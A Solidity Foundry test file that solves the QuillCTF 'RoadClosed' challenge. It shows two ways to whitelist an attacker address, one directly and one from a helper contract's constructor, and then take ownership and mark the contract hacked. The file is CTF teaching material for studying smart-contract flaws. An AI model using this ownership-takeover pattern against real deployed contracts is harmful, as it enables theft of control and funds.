// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import '../../src/QuillCTF/RoadClosed.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

interface IRoadClosed {
  function addToWhitelist(address addr) external;
}

contract Helper {
  constructor(address _target, address _whitelisted) {
    console2.log('Exploiter adds its own address to the whitelist');
    IRoadClosed(_target).addToWhitelist(_whitelisted);
  }
}

contract RoadClosedExploit is Test {
  RoadClosed target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  // Deploy the target contract
  function setUp() public {
    vm.startPrank(deployer);
    target = new RoadClosed();
    console2.log('Target contract deployed');
    vm.stopPrank();
  }

  function testNaiveExploit() public {
    vm.startPrank(exploiter);

    assertFalse(target.isOwner());
    assertFalse(target.isHacked());

    console2.log('Exploiter adds its own address to the whitelist');
    target.addToWhitelist(exploiter);

    console2.log('Exploiter takes ownership of the contract');
    target.changeOwner(exploiter);
    target.pwn(exploiter);
    assertTrue(target.isOwner());
    vm.stopPrank();

    assertTrue(target.isHacked());
    assertFalse(target.isOwner());
  }

  function testExploitWithHelperContract() public {
    vm.startPrank(exploiter);

    assertFalse(target.isOwner());
    assertFalse(target.isHacked());

    console2.log('Exploiter deploys the helper contract');
    new Helper(address(target), exploiter);

    console2.log('Exploiter takes ownership of the contract');
    target.changeOwner(exploiter);
    target.pwn(exploiter);
    assertTrue(target.isOwner());
    vm.stopPrank();

    assertTrue(target.isHacked());
    assertFalse(target.isOwner());
  }
}
